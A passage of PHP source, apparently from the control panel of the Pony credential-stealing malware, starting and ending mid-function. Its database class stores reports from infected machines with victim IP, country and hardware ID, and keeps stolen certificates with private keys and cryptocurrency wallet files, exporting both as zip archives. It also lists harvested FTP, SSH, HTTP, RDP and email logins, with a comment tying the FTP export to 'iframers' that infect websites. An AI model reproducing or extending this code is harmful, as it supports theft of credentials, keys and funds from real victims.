			mysql_real_escape_string($hash),
			mysql_real_escape_string($data));

		$result = mysql_query($query, $this->db_link);
		
		if (!$result)
		{
			$this->state = false;
			return false;
		} else
		{
			$data_id = mysql_insert_id($this->db_link);
		}	

		if ($data_id == 0)
		{
			$this->state = false;
			return false;
		} 

		$query = sprintf("INSERT INTO pony_report
			(parsed, import_time, report_source_ip, report_country, data_id)
			VALUES ('%s', '%s', '%s', '%s', '%s')",
			mysql_real_escape_string(intval(0)),					// parsed
			mysql_real_escape_string(mysql_now_date()),				// import_time
			mysql_real_escape_string($ip),							// report_source_ip
			mysql_real_escape_string($country),						// report_country
            mysql_real_escape_string($data_id)						// data_id
            );

		$result = mysql_query($query, $this->db_link);
		
		if (!$result)
		{
			$this->state = false;
			return false;
		} else
		{
			return mysql_insert_id($this->db_link);
		}	
	}
	
	function add_parsed_report($os_name, $country, $is_win64, $is_admin, $ip, $hwid, $version, $data, $ftp_list, $log)
	{
		if (strlen($data) == 0)
			return false;
			
		$hash = mixed_sha1($data);
		if (!$this->state || $this->report_exists($hash))
    		return false;
    		
		$query = sprintf("INSERT INTO pony_report
			(parsed, import_time, report_os_name, report_country, report_is_win64, report_admin, report_source_ip, report_hwid, report_version, data_hash, data) 
			VALUES ('%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s')",
			mysql_real_escape_string(intval(1)),					// parsed
			mysql_real_escape_string(mysql_now_date()),	// import_time
			mysql_real_escape_string($os_name),						// report_os_name
			mysql_real_escape_string($country),						// report_country
			mysql_real_escape_string(intval($is_win64 == 1)),		// report_is_win64
			mysql_real_escape_string(intval($is_admin == 1)),		// report_admin
            mysql_real_escape_string($ip),							// report_source_ip
            mysql_real_escape_string($hwid),						// report_hwid
            mysql_real_escape_string($version),						// report_version
            mysql_real_escape_string($hash),						// data_hash
            mysql_real_escape_string($data)							// data
            );

		$result = mysql_query($query, $this->db_link);
		
		if (!$result)
		{
			$this->state = false;
			return false;
		} else
		{
			$report_id = mysql_insert_id($this->db_link);
			if ($report_id)
			{
				// write url (ftp/http) list
				$this->import_url_list($ftp_list, $report_id);
				if (!$this->state)
					return false;

				// write logs
				$this->import_log_list($log, CLOG_SOURCE_REPORT, $report_id);
				if (!$this->state)
					return false;
			}
		}

		return true;
	}


	function cert_exists($data_hash)
	{
		$data_hash = trim($data_hash);
		
    	if (!$this->state || !strlen($data_hash))
    		return false;
    		
		$query = sprintf("SELECT data_hash FROM pony_cert WHERE data_hash='%s' LIMIT 1",
            mysql_real_escape_string($data_hash));
                		
		$result = mysql_query($query, $this->db_link);

		if (!$result)
		{
			$this->state = false;
		} else
		{
			if (mysql_num_rows($result) == 1)
				return true;
		}
		
		return false;
	}

	function add_cert($cert, $pvt_key, $cert_client, $report_id)
	{
		$report_id = intval($report_id);
		
		if (!$this->state || !strlen($cert) || !strlen($pvt_key) || $report_id <= 0)
			return false;

		$data_hash = mixed_sha1($cert."<!__!>".$pvt_key);

		$query = sprintf("INSERT DELAYED IGNORE INTO pony_cert
			(report_id, cert_data, pvtkey_data, data_hash, cert_client, import_time) 
			VALUES ('%s', '%s', '%s', '%s', '%s', '%s')",
			mysql_real_escape_string($report_id),		// source report id
			mysql_real_escape_string($cert),			// certificate data
			mysql_real_escape_string($pvt_key),			// private key data
			mysql_real_escape_string($data_hash),
			mysql_real_escape_string($cert_client),
            mysql_real_escape_string(mysql_now_date())  // import_time
            );

		$result = mysql_query($query, $this->db_link);

		if (!$result)
		{
			return false;
		}
		
		return true;		
	}

	function add_wallet($wallet, $wallet_client, $report_id)
	{
		$report_id = intval($report_id);
		
		if (!$this->state || !strlen($wallet) || $report_id <= 0)
			return false;

		$data_hash = mixed_sha1($wallet);

		$query = sprintf("INSERT DELAYED IGNORE INTO pony_wallet
			(report_id, wallet_data, data_hash, wallet_client, import_time) 
			VALUES ('%s', '%s', '%s', '%s', '%s')",
			mysql_real_escape_string($report_id),		// source report id
			mysql_real_escape_string($wallet),			// wallet data
			mysql_real_escape_string($data_hash),
			mysql_real_escape_string($wallet_client),
            mysql_real_escape_string(mysql_now_date())  // import_time
            );

		$result = mysql_query($query, $this->db_link);

		if (!$result)
		{
			return false;
		}
		
		return true;		
	}

	function get_cert_zip()
	{
    	if (!$this->state)
    		return false;
    		
		global $global_temporary_directory;

		$tmp_name = tempnam($global_temporary_directory, 'zip');

		if (!is_writable($global_temporary_directory))
		{
			return false;
		}

		$zip = new ZipArchive();

		if ($zip->open($tmp_name, ZIPARCHIVE::CREATE)!==TRUE)
		{
		    return false;
		}

		$query = sprintf("SELECT cert_id, cert_data, pvtkey_data FROM pony_cert");
		$result = mysql_query($query, $this->db_link);

		if (!$result)
		{
			$this->state = false;
		} else
		{
			while ($row = mysql_fetch_assoc($result))
			{
				$zip->addFromString($row['cert_id']."_cert.crt", $row['cert_data']);
				$zip->addFromString($row['cert_id']."_pvtkey.blob", $row['pvtkey_data']);
			}
		}

		$zip->close();
		unset($zip);

		if ($this->state)
		{
			$fp = fopen($tmp_name, "rb");
			if ($fp)
			{
				while (!feof($fp))
				{
					echo fread($fp, 8192);
				}
				fclose($fp);
			}
		}
		unlink($tmp_name);

		return true;
	}

	function get_last_cert_date()
	{
		if (!$this->state)
			return false;
		
		$query = "SELECT import_time FROM pony_cert ORDER BY cert_id DESC LIMIT 1";
		$result = mysql_query($query, $this->db_link);
		
		if (!$result)
		{
			return false;
		}

		if ($row = mysql_fetch_assoc($result))
		{
			return $row['import_time'];
		}

		return false;
	}

	function get_wallet_zip()
	{
    	if (!$this->state)
    		return false;
    		
		global $global_temporary_directory;

		$tmp_name = tempnam($global_temporary_directory, 'zip');

		if (!is_writable($global_temporary_directory))
		{
			return false;
		}

		$zip = new ZipArchive();

		if ($zip->open($tmp_name, ZIPARCHIVE::CREATE)!==TRUE)
		{
		    return false;
		}

		$query = sprintf("SELECT wallet_id, wallet_data, wallet_client FROM pony_wallet");
		$result = mysql_query($query, $this->db_link);

		if (!$result)
		{
			$this->state = false;
		} else
		{
			while ($row = mysql_fetch_assoc($result))
			{
				if (($row['wallet_client'] == 'module_multibit') || ($row['wallet_client'] == 'module_bitcoin_armory'))
				{
					$extension = 'wallet';
				} else
				{
					$extension = 'dat';
				}
				$zip->addFromString(module_name_to_client_name($row['wallet_client']).'\\'.$row['wallet_id']."_wallet.".$extension, $row['wallet_data']);
			}
		}

		$zip->close();
		unset($zip);

		if ($this->state)
		{
			$fp = fopen($tmp_name, "rb");
			if ($fp)
			{
				while (!feof($fp))
				{
					echo fread($fp, 8192);
				}
				fclose($fp);
			}
		}
		unlink($tmp_name);

		return true;
	}

	function get_last_wallet_date()
	{
		if (!$this->state)
			return false;
		
		$query = "SELECT import_time FROM pony_wallet ORDER BY wallet_id DESC LIMIT 1";
		$result = mysql_query($query, $this->db_link);
		
		if (!$result)
		{
			return false;
		}

		if ($row = mysql_fetch_assoc($result))
		{
			return $row['import_time'];
		}

		return false;
	}

	function get_login_log(&$domain_list, $limit_count = 5)
	{
    	$limit_count = intval($limit_count);

    	if (!$this->state || $limit_count <= 0)
    		return false;
    		
		$query = sprintf("SELECT log_id, log_line, import_time, log_extra FROM pony_system_log WHERE (log_source='".CLOG_SOURCE_LOGIN."') ORDER BY log_id DESC LIMIT %s",
            mysql_real_escape_string($limit_count));
                		
		$result = mysql_query($query, $this->db_link);

		if (!$result)
		{
			$this->state = false;
		} else
		{
			while ($row = mysql_fetch_assoc($result))
			{
				array_push($domain_list, array('user' => $row['log_extra'], 'ip' => $row['log_line'], 'import_time' => $row['import_time']));
			}
			return true;
		}
		
		return false;		
	}
	
	function get_url_list($url_type, $raw_output, &$domain_list = null, $limit_count = 0, $url_subtype = 'both', $offset = 0, $filter_date_from = '', $filter_date_to = '', $filter_country = array(), $filter_domains_include = '', $filter_domains_exclude = '', $filter_trim_dirs = '', $count = false, $filter_text = '', $filter_export_ip = false)
	{
		$limit_count = intval($limit_count);
		$offset = intval($offset);

    	if (!$this->state || $limit_count < 0)
    		return false;

		$query = '';
		if (count($filter_country) || $filter_export_ip)
		{
			$query .= ' INNER JOIN pony_report USING (report_id) ';
		}

		if (strlen($filter_domains_include) || strlen($filter_domains_exclude))
		{
			$query .= ' LEFT JOIN pony_domainlist USING (domain_id) ';
		}

		if ($url_type == 'rdp')
		{
	    	$query .= " WHERE url_type='rdp' ";
		}
		else if ($url_type == 'ftp')
		{
	    	if ($url_subtype === 'both')
	    		$query .= " WHERE (url_type='ftp' OR url_type='ssh') ";
	    	else if ($url_subtype == 'ssh')
	    		$query .= " WHERE url_type='ssh' ";
	    	else
	    		$query .= " WHERE url_type='ftp' ";
		} else if ($url_type == 'http')
		{
    		$query .= " WHERE (url_type='http' OR url_type='https') ";
	    	if ($url_subtype === 'both')
	    	{
	    	}
	    	else if ($url_subtype == 'https')
	    		$query .= " AND url LIKE 'https://%' ";
	    	else
	    		$query .= " AND url LIKE 'http://%' ";
		}

		if ($offset > 0)
		{
			$query .= " AND ftp_id >= '".mysql_real_escape_string($offset)."'";
		}

		if (count($filter_country))
		{
			$filter_country_escaped = array();
			foreach ($filter_country as $key=>$value)
			{
				$filter_country_escaped["'".mysql_real_escape_string($key)."'"] = 1;
			}
			$arrK = array_keys($filter_country_escaped);
			$country_list = implode(",", $arrK);

			$query .= ' AND report_country in ('.$country_list.')';
		}

		if (strlen($filter_date_from))
		{
			$time = strtotime($filter_date_from);
			if ($time !== false)
			{
				$query .= ' AND import_time >= \''.mysql_real_escape_string(date('Y-m-d H:i:s', $time))."'";
			}
		}

		if (strlen($filter_date_to))
		{
			$time = strtotime($filter_date_to);
			if ($time !== false)
			{
				$query .= ' AND import_time <= \''.mysql_real_escape_string(date('Y-m-d H:i:s', $time))."'";
			}
		}

		if (strlen($filter_domains_include))
		{
			$query .= " AND (";
			$include_domains_array = explode(",", $filter_domains_include);
			$first_addition = true;
			foreach ($include_domains_array as $key=>$value)
			{
				if (!$first_addition)
				{
					$query .= ' OR ';
				}
				$query .= "url_domain LIKE '%".mysql_real_escape_string(trim($include_domains_array[$key]))."%'";
				$first_addition = false;
			}
			$query .= " ) ";
		}

		if (strlen($filter_domains_exclude))
		{
			$query .= " AND (";
			$exclude_domains_array = explode(",", $filter_domains_exclude);
			$first_addition = true;
			foreach ($exclude_domains_array as $key=>$value)
			{
				if (!$first_addition)
				{
					$query .= ' AND ';
				}
				$query .= "NOT url_domain LIKE '%".mysql_real_escape_string(trim($exclude_domains_array[$key]))."%'";
				$first_addition = false;
			}
			$query .= " ) ";
		}

		if (strlen($filter_text))
		{
			$query .= " AND url like '%".mysql_real_escape_string($filter_text)."%'";
		}

		$query_clause = $query;

		$query = "SELECT ftp_id, report_id, url, pony_ftp.import_time, ftp_client";
		if ($filter_export_ip)
			$query .= ', report_source_ip';
		$query .= " FROM pony_ftp $query_clause ";

		$query .= ' ORDER BY ftp_id DESC';

    	if ($limit_count)
			$query .= " LIMIT ".mysql_real_escape_string($limit_count);
			
		$result = mysql_query($query, $this->db_link);

		if (!$result)
		{
			$this->state = false;
		} else
		{
			// additional dupe check is required if 'remove dirs/paths' option was supplied
			// as URLs without dirs could be a cause of duplicate lines (lines with char differences in dir/path part only)
			$dupe_check = array();
			if (!$count)
			{
				// simple row output
				while ($row = mysql_fetch_assoc($result))
				{
					if ($raw_output)
					{
						if ($filter_trim_dirs == '1')
						{
							// remove FTP dirs/paths (required for some FTP iframers)
							$url_line = trim_ftp_dir($row['url']);
							if ($filter_export_ip)
								$url_line .= ';'.$row['report_source_ip'];
							array_push($dupe_check, $url_line);
						} else
						{
							if ($filter_export_ip)
								echo remove_zero_char($row['url']).';'.$row['report_source_ip']."\r\n";
							else
								echo remove_zero_char($row['url'])."\r\n";
						}
					}
					else
					{
						array_push($domain_list, $row);
					}
				}

				if ($filter_trim_dirs == '1')
				{
					$dupe_check = array_unique($dupe_check);
					foreach ($dupe_check as $url)
					{
						echo remove_zero_char($url)."\r\n";
					}
				}
				return true;
			} else
			{
				// count all found rows and write up to $row_limit rows into the output list
				$row_count = 0;
				$row_limit = 10;
				$rows = array();
				if ($filter_trim_dirs == '1')
				{
					// remove FTP dirs/paths (required for some FTP iframers)
					while ($row = mysql_fetch_assoc($result))
					{
						$uniq_array[trim_ftp_dir($row['url'])] = array($row['ftp_client'], $row['import_time'], $row['report_id']);
					}

					foreach ($uniq_array as $key=>$value)
					{
						if (!$row_limit--)
							break;
						$rows[] = array('url'=>remove_zero_char($key), 'ftp_client'=>module_name_to_client_name($value[0]), 'module'=>$value[0], 'import_time'=>$value[1], 'report_id'=>$value[2]);
					}

					$row_count = count($uniq_array);
				} else
				{
					while (($row = mysql_fetch_assoc($result)) && $row_limit--)
					{
						$rows[] = array('url'=>remove_zero_char($row['url']), 'ftp_client'=>module_name_to_client_name($row['ftp_client']), 'module'=>$row['ftp_client'], 'import_time'=>$row['import_time'], 'report_id'=>$row['report_id']);
					}
					$row_count = mysql_num_rows($result);
				}

				return array('count'=>$row_count, 'list'=>$rows);
			}
		}		
		return false;		
	}

	function get_ftp_list($raw_output, &$domain_list = null, $limit_count = 0, $url_subtype = 'ftp', $offset = 0, $filter_date_from = '', $filter_date_to = '', $filter_country = array(), $filter_domains_include = '', $filter_domains_exclude = '', $filter_trim_dirs = '', $count = false, $filter_text = '', $filter_export_ip = false)
	{
		return $this->get_url_list('ftp', $raw_output, $domain_list, $limit_count, $url_subtype, $offset, $filter_date_from, $filter_date_to, $filter_country, $filter_domains_include, $filter_domains_exclude, $filter_trim_dirs, $count, $filter_text, $filter_export_ip);
	}

	function get_http_list($raw_output, &$domain_list = null, $limit_count = 0, $url_subtype = 'both', $offset = 0, $filter_date_from = '', $filter_date_to = '', $filter_country = array(), $filter_domains_include = '', $filter_domains_exclude = '', $filter_trim_dirs = '', $count = false, $filter_text = '', $filter_export_ip = false)
	{
		return $this->get_url_list('http', $raw_output, $domain_list, $limit_count, $url_subtype, $offset, $filter_date_from, $filter_date_to, $filter_country, $filter_domains_include, $filter_domains_exclude, $filter_trim_dirs, $count, $filter_text, $filter_export_ip);
	}

	function get_rdp_list($raw_output, &$domain_list = null, $limit_count = 0, $url_subtype = 'both', $offset = 0, $filter_date_from = '', $filter_date_to = '', $filter_country = array(), $filter_domains_include = '', $filter_domains_exclude = '', $filter_trim_dirs = '', $count = false, $filter_text = '', $filter_export_ip = false)
	{
		return $this->get_url_list('rdp', $raw_output, $domain_list, $limit_count, $url_subtype, $offset, $filter_date_from, $filter_date_to, $filter_country, $filter_domains_include, $filter_domains_exclude, $filter_trim_dirs, $count, $filter_text, $filter_export_ip);
	}

	function get_email_list($raw_output, &$email_list = null, $limit_count = 0, $protocol = '', $offset = 0)
	{
    	$offset = intval($offset);
    	$limit_count = intval($limit_count);
    	$protocol = trim($protocol);

    	if (!$this->state || $limit_count < 0 || $offset < 0)
    		return false;

		$where = "WHERE email_id >= '".mysql_real_escape_string($offset)."'";

		if (strlen($protocol))
		{
    		$where .= sprintf("AND protocol='%s'", mysql_real_escape_string($protocol));
		}
    		
    	if ($limit_count == 0)
    		$query = sprintf("SELECT * FROM ".CPONY_EMAIL_TABLE." $where ORDER BY email_id DESC");
    	else
			$query = sprintf("SELECT * FROM ".CPONY_EMAIL_TABLE." $where ORDER BY email_id DESC LIMIT %s",
						mysql_real_escape_string($limit_count));
                		
		$result = mysql_query($query, $this->db_link);

		if (!$result)
		{
			$this->state = false;
		} else
		{
			while ($row = mysql_fetch_assoc($result))
			{                    
				if (!$raw_output)
					array_push($email_list, $row);
				else
				{
					echo remove_zero_char(report_parser::flat_email_array($row))."\r\n";
				}
			}
			return true;
		}
		
		return false;			
	}

	function get_table_row_count($table_name, $where_clause = '')
	{
		$table_name = trim($table_name);
		$where_clause = trim($where_clause);
    	if (!$this->state || !strlen($table_name))
    		return false;

    	if (strlen($where_clause))
			$query = sprintf("SELECT COUNT(*) as count FROM %s ", mysql_real_escape_string($table_name)).$where_clause;
		else
			$query = sprintf("SELECT COUNT(*) as count FROM %s", mysql_real_escape_string($table_name));

		$result = mysql_query($query, $this->db_link);
		
		if (!$result)
		{
			$this->state = false;
		} else
		{
			if ($row = mysql_fetch_assoc($result))
			{
				return $row['count'];
			}
		}
		
		return false;	
	}
	
	function get_report_sum($where_clause = '', $offset = 0)
	{
		$where_clause = trim($where_clause);
		$offset = intval($offset);
    	if (!$this->state)
    		return false;

    	if (strlen($where_clause))
    	{
    		$query = sprintf("SELECT SUM(OCTET_LENGTH(data)) as sum FROM pony_report_data ".$where_clause);
    		if ($offset > 0)
    		{
    			$query .= ' AND data_id >= \''.mysql_real_escape_string($offset)."'";
    		}
		}
    	else
    	{
			$query = sprintf("SELECT SUM(OCTET_LENGTH(data)) as sum FROM pony_report_data");
    		if ($offset > 0)
    		{
    			$query .= ' WHERE data_id >= \''.mysql_real_escape_string($offset)."'";
    		}

		}
		
		$result = mysql_query($query, $this->db_link);
		
		if (!$result)
		{
			$this->state = false;
		} else
		{
			if ($row = mysql_fetch_assoc($result))
			{
				return $row['sum'];
			}
		}
		
		return false;	
	}

	function get_report_sum_linked($where_clause = '', $offset = 0)
	{
		$where_clause = trim($where_clause);
		$offset = intval($offset);
    	if (!$this->state)
    		return false;

    	if (strlen($where_clause))
    	{
    		$query = "SELECT SUM(OCTET_LENGTH(data)) as sum FROM pony_report INNER JOIN pony_report_data USING (data_id) ".$where_clause;
    		if ($offset > 0)
    		{
    			$query .= ' AND report_id >= \''.mysql_real_escape_string($offset)."'";
    		}
		}
		else
		{
			$query = "SELECT SUM(OCTET_LENGTH(data)) as sum FROM pony_report_data";
    		if ($offset > 0)
    		{
    			$query .= ' WHERE report_id >= \''.mysql_real_escape_string($offset)."'";
    		}
		}

		$result = mysql_query($query, $this->db_link);
		
		if (!$result)
		{
			$this->state = false;
		} else
		{
			if ($row = mysql_fetch_assoc($result))
			{
				return $row['sum'];
			}
		}
		
		return false;
	}
	
	function get_db_size()
	{
    	if (!$this->state)
    		return false;

		$query = sprintf("SELECT SUM(data_length + index_length) as sum FROM information_schema.TABLES WHERE (table_schema='%s')", mysql_real_escape_string($this->database));
		
		$result = mysql_query($query, $this->db_link);
		
		if (!$result)
		{
			$this->state = false;
		} else
		{
			if ($row = mysql_fetch_assoc($result))
			{
				return $row['sum'];
			}
		}
		
		return false;	
	}
	
	function get_table_size($table_name)
	{
		$table_name = trim($table_name);
    	if (!$this->state || strlen($table_name) == 0)
    		return false;

		$query = sprintf("SELECT SUM(data_length + index_length) as sum FROM information_schema.TABLES WHERE (table_schema='%s' AND table_name='%s')", mysql_real_escape_string($this->database), mysql_real_escape_string($table_name));
		
		$result = mysql_query($query, $this->db_link);
		
		if (!$result)
		{
			$this->state = false;
		} else
		{
			if ($row = mysql_fetch_assoc($result))
			{
				return $row['sum'];
			}
		}
		
		return false;	
	}		
	
	function export_reports($nonparsed_only)
	{
    	if (!$this->state)
    		return false;

    	if ($nonparsed_only)
    		$query = sprintf("SELECT * FROM %s INNER JOIN pony_report_data USING (data_id) ORDER BY report_id DESC WHERE parsed='0' ", mysql_real_escape_string(CPONY_REPORT_TABLE));
    	else
			$query = sprintf("SELECT * FROM %s INNER JOIN pony_report_data USING (data_id) ORDER BY report_id DESC", mysql_real_escape_string(CPONY_REPORT_TABLE));
		
		$result = mysql_query($query, $this->db_link);
		
		if (!$result)
		{
			$this->state = false;
		} else
		{
			while ($row = mysql_fetch_assoc($result))
			{
				echo sprintf("INSERT IGNORE INTO %s (data_hash, data) VALUES('%s', '%s');\r\n".
							"INSERT INTO %s (parsed, report_os_name, import_time, report_country, report_is_win64, report_admin, report_source_ip, report_hwid, report_version, data_id) ".
							"SELECT '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', LAST_INSERT_ID() FROM DUAL WHERE LAST_INSERT_ID() > 0;\r\n",
							mysql_real_escape_string(CPONY_REPORT_DATA_TABLE),
							mysql_real_escape_string($row['data_hash']),
							mysql_real_escape_string($row['data']),
							mysql_real_escape_string(CPONY_REPORT_TABLE),
							mysql_real_escape_string($row['parsed']),
							mysql_real_escape_string($row['report_os_name']),
							mysql_real_escape_string($row['import_time']),
							mysql_real_escape_string($row['report_country']),
							mysql_real_escape_string($row['report_is_win64']),
							mysql_real_escape_string($row['report_admin']),
							mysql_real_escape_string($row['report_source_ip']),
							mysql_real_escape_string($row['report_hwid']),
							mysql_real_escape_string($row['report_version']),
							mysql_real_escape_string($row['report_country']));
			}
		}
		
		return false;
	}
	
	function clear_table($table_name, $where_clause = '')
	{
		$table_name = trim($table_name);
		$where_clause = trim($where_clause);
    	if (!$this->state || !strlen($table_name))
    		return false;

		$query = sprintf("DELETE FROM %s", mysql_real_escape_string($table_name));
		
		if (strlen($where_clause))
			$query .= ' '.$where_clause;
			
		
		$result = mysql_query($query, $this->db_link);
		
		if (!$result)
		{
			$this->state = false;
		} else
		{
			return true;
		}
		
		return false;			
	}

	function truncate_table($table_name)
	{
		$table_name = trim($table_name);
    	if (!$this->state || !strlen($table_name))
    		return false;

		$query = sprintf("TRUNCATE %s", mysql_real_escape_string($table_name));
		
		$result = mysql_query($query, $this->db_link);
		
		if (!$result)
		{
			$this->state = false;
		} else
		{
			return true;
		}
		
		return false;			
	}
	
	function get_domains(&$domain_list)
	{
    	if (!$this->state)
    		return false;
    		
		$query = sprintf("SELECT domain_id, url FROM %s ORDER BY domain_id DESC", mysql_real_escape_string(CPONY_DOMAIN_TABLE));
                		
		$result = mysql_query($query, $this->db_link);

		if (!$result)
		{
			$this->state = false;
		} else
		{
			while ($row = mysql_fetch_assoc($result))
			{
				array_push($domain_list, $row);
			}
			return true;
		}
		
		return false;
	}
	
	function delete_domain($domain_id)
	{
		$domain_id = intval($domain_id);
		
    	if (!$this->state || $domain_id < 0)
    		return false;
    		
		$query = sprintf("DELETE FROM %s WHERE domain_id='%s'", mysql_real_escape_string(CPONY_DOMAIN_TABLE), 
			mysql_real_escape_string($domain_id));
                		
		$result = mysql_query($query, $this->db_link);

		if (!$result)
		{
			$this->state = false;
		} else
		{
			return true;
		}
		
		return false;
	}
	
	function find_domain($domain_id)
	{
		$domain_id = intval($domain_id);
		
    	if (!$this->state || $domain_id < 0)
    		return false;
    		
		$query = sprintf("SELECT url, ping_time, ping_status FROM %s WHERE domain_id='%s'", 
			mysql_real_escape_string(CPONY_DOMAIN_TABLE),
			mysql_real_escape_string($domain_id));
                		
		$result = mysql_query($query, $this->db_link);

		if (!$result)
		{
			$this->state = false;
		} else
		{
			while ($row = mysql_fetch_assoc($result))
			{
				return array($row['url'], $row['ping_time'], $row['ping_status']);
			}
			return true;
		}
	}
	
	function update_domain($domain_id, $ping_status)
	{
		$domain_id = intval($domain_id);
		$ping_status = trim($ping_status);
		
    	if (!$this->state || $domain_id < 0 || !strlen($ping_status))
    		return false;
  			
  		$query = sprintf("UPDATE pony_domain SET ping_status='%s', ping_time='%s' WHERE (domain_id='%s')",
  			mysql_real_escape_string($ping_status),
            mysql_real_escape_string(mysql_now_date()),
            mysql_real_escape_string($domain_id));
        
        $result = mysql_query($query, $this->db_link);
                                            
		if (!$result)
		{
			$this->state = false;
		} else
		{
			return true;
		}
		
		return false;
	}
		
	function get_log_item($id)
	{
		$id = intval($id);
		
    	if (!$this->state || $id < 0)
    		return false;
    		
    	$query = sprintf("SELECT log_id, report_id, log_line, import_time, log_extra FROM pony_system_log WHERE (log_id='%s' AND (log_source='".CLOG_SOURCE_REPORT."' OR log_source='".CLOG_SOURCE_GATE."'))",
    		mysql_real_escape_string($id));
    	
    	$result = mysql_query($query, $this->db_link);
    		
    	if (!$result)
		{
			$this->state = false;
		} else
		{
			if ($row = mysql_fetch_assoc($result))
				return $row;
			return false;
		}
		
		return false;			
	}
	
	function get_report_item($id)
	{
		$id = intval($id);
		
    	if (!$this->state || $id < 0)
    		return false;

		$query = sprintf("SELECT *, OCTET_LENGTH(data) as report_len FROM %s INNER JOIN pony_report_data USING (data_id) WHERE (report_id='%s')",
			mysql_real_escape_string(CPONY_REPORT_TABLE), 
			mysql_real_escape_string($id));
		
		$result = mysql_query($query, $this->db_link);

		if (!$result)
		{
			$this->state = false;
		} else
		{
			if ($row = mysql_fetch_assoc($result))
			{
				return $row;
			}
		}
		
		return false;	
	}	

	function get_log_list(&$domain_list, $limit_start = 0, $limit_count = 0, $raw_output = false)
	{
    	$limit_start = intval($limit_start);
    	$limit_count = intval($limit_count);

    	if (!$this->state || $limit_count < 0 || $limit_start < 0)
    		return false;
    		
    	if ($limit_start == 0 && $limit_count == 0)
    		$query = sprintf("SELECT log_id, report_id, log_line, import_time, log_extra FROM ".CPONY_LOG_TABLE." WHERE (log_source='".CLOG_SOURCE_REPORT."' OR log_source='".CLOG_SOURCE_GATE."') ORDER BY log_id DESC");
    	else
			$query = sprintf("SELECT log_id, report_id, log_line, import_time, log_extra FROM ".CPONY_LOG_TABLE." WHERE (log_source='".CLOG_SOURCE_REPORT."' OR log_source='".CLOG_SOURCE_GATE."') ORDER BY log_id DESC LIMIT %s, %s",
						mysql_real_escape_string($limit_start),
						mysql_real_escape_string($limit_count));
                		
		$result = mysql_query($query, $this->db_link);

		if (!$result)
		{
			$this->state = false;
		} else
		{
			while ($row = mysql_fetch_assoc($result))
			{                    
				if (!$raw_output)
					array_push($domain_list, array('log_id' => $row['log_id'], 'report_id' => $row['report_id'], 'log_extra' => $row['log_extra'], 'log_line' => $row['log_line'], 'import_time' => $row['import_time']));
				else
					echo $row['report_id']." | ".$row['log_line']." | ".$row['log_extra']."\r\n";
			}
			return true;
		}
		
		return false;			
	}

	function get_log_list_report_filter(&$domain_list, $limit_start = 0, $limit_count = 0, $raw_output = false, $report_source_ip = '', $report_hwid = '', $filter_notify = '')
	{
    	$limit_start = intval($limit_start);
    	$limit_count = intval($limit_count);
    	$report_source_ip = trim($report_source_ip);
    	$report_hwid = trim($report_hwid);

    	if (!$this->state || $limit_count < 0 || $limit_start < 0)
    		return false;
    				
    	// SELECT
    	$query = str_replace('%s', CPONY_LOG_TABLE, "(SELECT %s.log_id as log_id, %s.report_id, %s.log_line, %s.import_time as import_time, %s.log_extra FROM ".CPONY_LOG_TABLE);
    	
    	// JOIN tables
    	if (strlen($report_source_ip) || strlen($report_hwid))
    		$query .= ' INNER JOIN pony_report USING (report_id)';
    		
    	// WHERE clause
    	// AND log_line LIKE 'ERR_CUTEFTP_DAT%'
    	// AND NOT log_line='ERR_IMPORT_FAILED' AND NOT log_line='ERR_REPORT_CRC_MISMATCH' AND NOT log_line='ERR_REPORT_WRONG_PASSWORD'
    	$query .= " WHERE ((".CPONY_LOG_TABLE.".log_source='".CLOG_SOURCE_REPORT."' OR ".CPONY_LOG_TABLE.".log_source='".CLOG_SOURCE_GATE."')";
    	// append IP filter
    	if (strlen($report_source_ip))
    		$query .= ' AND '.CPONY_REPORT_TABLE.'.report_source_ip=\''.mysql_real_escape_string($report_source_ip).'\'';
    	// append HWID filter
    	if (strlen($report_hwid))
    		$query .= ' AND '.CPONY_REPORT_TABLE.'.report_hwid=\''.mysql_real_escape_string($report_hwid).'\'';
    	$query .= ")";
    		
    	if ($filter_notify != '1')
    		$query .= " AND (".CPONY_LOG_TABLE.".log_type<>'notify')";
             
        $query .= ')'; // SELECT 

    	if (strlen($report_source_ip) && !strlen($report_hwid))
    	{
            $query .= " UNION (". str_replace('%s', CPONY_LOG_TABLE, "SELECT %s.log_id as log_id, %s.report_id, %s.log_line, %s.import_time as import_time, %s.log_extra FROM ".CPONY_LOG_TABLE).
                " WHERE ".CPONY_LOG_TABLE.".log_source='".CLOG_SOURCE_GATE."' AND ".CPONY_LOG_TABLE.".log_extra='".mysql_real_escape_string($report_source_ip)."'";
            
            if ($filter_notify != '1')
                $query .= " AND ".CPONY_LOG_TABLE.".log_type<>'notify'";
            
            $query .= ")";
		}
		
		// sorting
    	$query .= " ORDER BY log_id DESC";
   		
		// limiting
    	if ($limit_start != 0 || $limit_count != 0)
    		$query .= sprintf(" LIMIT %s, %s",
						mysql_real_escape_string($limit_start),
						mysql_real_escape_string($limit_count));
		
		$result = mysql_query($query, $this->db_link);

		if (!$result)
		{
			$this->state = false;
		} else
		{
			while ($row = mysql_fetch_assoc($result))
			{                    
				if (!$raw_output)
					array_push($domain_list, array('log_id' => $row['log_id'], 'report_id' => $row['report_id'], 'log_extra' => $row['log_extra'], 'log_line' => $row['log_line'], 'import_time' => $row['import_time']));
				else
					echo $row['report_id']." | ".$row['log_line']." | ".$row['log_extra']."\r\n";
			}
			return true;
		}
		
		return false;			
	}	
	
	function get_log_row_count_filter($report_source_ip = '', $report_hwid = '', $filter_notify = '')
	{
    	$report_source_ip = trim($report_source_ip);
    	$report_hwid = trim($report_hwid);
    	if (!$this->state)
    		return false;

		// SELECT
    	$query = str_replace('%s', CPONY_LOG_TABLE, "(SELECT %s.log_id as log_id, %s.report_id, %s.log_line, %s.import_time as import_time, %s.log_extra FROM ".CPONY_LOG_TABLE);

		// JOIN tables
		if (strlen($report_source_ip) || strlen($report_hwid))
			$query .= ' INNER JOIN pony_report USING (report_id)';
    		
    	// WHERE clause
    	$query .= " WHERE ((".CPONY_LOG_TABLE.".log_source='".CLOG_SOURCE_REPORT."' OR ".CPONY_LOG_TABLE.".log_source='".CLOG_SOURCE_GATE."')";
    	// append IP filter
    	if (strlen($report_source_ip))
    		$query .= ' AND '.CPONY_REPORT_TABLE.'.report_source_ip=\''.mysql_real_escape_string($report_source_ip).'\'';
    	// append HWID filter
    	if (strlen($report_hwid))
    		$query .= ' AND '.CPONY_REPORT_TABLE.'.report_hwid=\''.mysql_real_escape_string($report_hwid).'\'';    		
        $query .= ')';
    		
    	if ($filter_notify != '1')
    		$query .= " AND (".CPONY_LOG_TABLE.".log_type<>'notify')";
            
